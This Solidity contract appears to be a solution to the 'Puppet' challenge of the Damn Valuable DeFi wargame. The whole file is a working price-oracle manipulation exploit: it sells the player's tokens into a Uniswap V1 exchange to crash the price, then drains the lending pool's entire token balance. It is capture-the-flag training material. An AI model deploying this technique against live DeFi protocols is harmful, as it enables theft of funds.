// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";

interface IUniswapV1Exchange {
    function tokenToEthTransferInput(
        uint256 tokens_sold, 
        uint256 min_eth, 
        uint256 deadline, 
        address payable recipient
    ) external returns (uint256);
}

contract PuppetAttacker {

    PuppetPool public immutable pool;
    IUniswapV1Exchange public immutable exchange;
    DamnValuableToken public immutable token;
    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 10 ** 18;
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;

    constructor(address _pool, uint8 v, bytes32 r, bytes32 s, uint256 deadline) payable {

        pool = PuppetPool(_pool);
        exchange = IUniswapV1Exchange(pool.uniswapPair());
        token = pool.token();

        token.permit(
            msg.sender, 
            address(this), 
            PLAYER_INITIAL_TOKEN_BALANCE, 
            deadline, 
            v, 
            r, 
            s
        );
        token.transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);

        token.approve(address(exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        exchange.tokenToEthTransferInput(
            PLAYER_INITIAL_TOKEN_BALANCE, 
            1, 
            block.timestamp, 
            payable(address(this))
        );

        pool.borrow{value: address(this).balance}(
            POOL_INITIAL_TOKEN_BALANCE, 
            msg.sender
        );

    }

    receive() external payable {}
    
}